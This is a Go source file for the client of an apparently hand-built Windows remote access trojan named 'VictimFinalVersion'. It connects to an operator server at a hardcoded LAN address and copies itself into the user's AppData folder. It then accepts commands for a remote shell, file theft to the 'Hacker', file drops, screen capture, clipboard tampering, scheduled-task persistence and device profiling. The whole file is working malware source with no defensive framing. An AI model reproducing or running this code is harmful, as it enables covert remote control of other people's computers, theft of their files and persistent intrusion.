package main

import (
	"VictimFinalVersion/core/Download"
	"VictimFinalVersion/core/ExecuteSystemCommandWindows"
	"VictimFinalVersion/core/Move"
	"VictimFinalVersion/core/alert"
	"VictimFinalVersion/core/appdata"
	"VictimFinalVersion/core/audio"
	"VictimFinalVersion/core/clipboard"
	"VictimFinalVersion/core/device"
	"VictimFinalVersion/core/handleConnection"
	"VictimFinalVersion/core/persist"
	"VictimFinalVersion/core/snap"
	"VictimFinalVersion/core/upload"
	"VictimFinalVersion/core/wall"
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}

}
func main() {

	ServerIP := "192.168.0.202"
	Port := "9090"
	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Print("\033[H\033[2J")
	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())

	bootRun()

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {

		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSpace(user_input_raw)

		switch {
		case user_input == "shell":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "navigate":
			fmt.Println("[+] File system Naviagtion")

			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "upload":
			fmt.Println("[+] Downloading File From Server/Hacker")
			err = Download.ReadFileContents(connection)
			DisplayError(err)

		case user_input == "download":
			fmt.Println("[+] Uploading File to the Hacker")
			err = upload.Upload2Hacker(connection)
			DisplayError(err)

		case user_input == "snap":
			fmt.Println("[+] Snap Saved")
			err = snap.ScreenCapture(connection)
			DisplayError(err)

		case user_input == "alert":
			fmt.Println("[+] Alert Popping")
			err = alert.Dialog(connection)
			DisplayError(err)

		case user_input == "wallpaper":
			fmt.Println("[+] Waiting for URL")
			err = wall.Url(connection)
			DisplayError(err)

		case user_input == "clipboard":
			fmt.Println("Waiting for clip_wright")
			err = clipboard.Write(connection)
			DisplayError(err)

		case user_input == "appdata":
			fmt.Println("[+] Trying to change dir")
			err = appdata.Dir(connection)
			DisplayError(err)

		case user_input == "make_noise":
			fmt.Println("[+] Trying to make noise")
			err = audio.Player(connection)
			DisplayError(err)

		case user_input == "persist":
			fmt.Println("[+] Trying to make base under appdata")
			err = persist.Schedule(connection)
			DisplayError(err)

		case user_input == "disarm&exit":
			fmt.Println("[+] removing persistance")
			err = persist.Remove(connection)
			DisplayError(err)

		case user_input == "device_info":
			fmt.Println("[+] Providing playground info")
			err = device.Info(connection)
			DisplayError(err)

		case user_input == "exit":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false

		case user_input == "clear" || user_input == "cls":
			fmt.Print("\033[H\033[2J")

		case user_input == "help":

		default:
			fmt.Println("[-] Invalid command")
		}
	}
}

func bootRun() {
	home, _ := os.UserHomeDir()
	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)

	c1 := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
	if c1 != nil {
		panic(c1)
	}

	if _, err := os.Stat(filepath.Join(home, "AppData\\Roaming", without_ext)); os.IsNotExist(err) {

		e := os.Mkdir(without_ext, 0755)
		if e != nil {
			panic(e)
		}
	}

	c2 := exec.Command("powershell", "Copy-Item", "./"+os.Args[0]+",./open.vbs", "-Destination", appdata)
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	c3 := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
	if c3 != nil {
		panic(c3)
	}
	return
}
